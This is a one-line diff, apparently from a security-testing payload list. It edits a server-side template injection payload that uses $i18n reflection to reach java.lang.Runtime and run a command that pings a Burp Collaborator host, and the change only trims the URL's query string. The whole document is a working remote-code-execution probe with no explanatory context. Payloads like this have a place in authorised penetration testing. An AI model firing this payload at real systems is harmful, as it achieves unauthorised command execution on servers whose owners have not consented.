@@ -1,1 +1,1 @@
-$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ping http://bbq0wd5b5ls4duam8o60ry13hunkb9.burpcollaborator.net/rcetest?a=a').waitFor()
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ping http://bbq0wd5b5ls4duam8o60ry13hunkb9.burpcollaborator.net').waitFor()
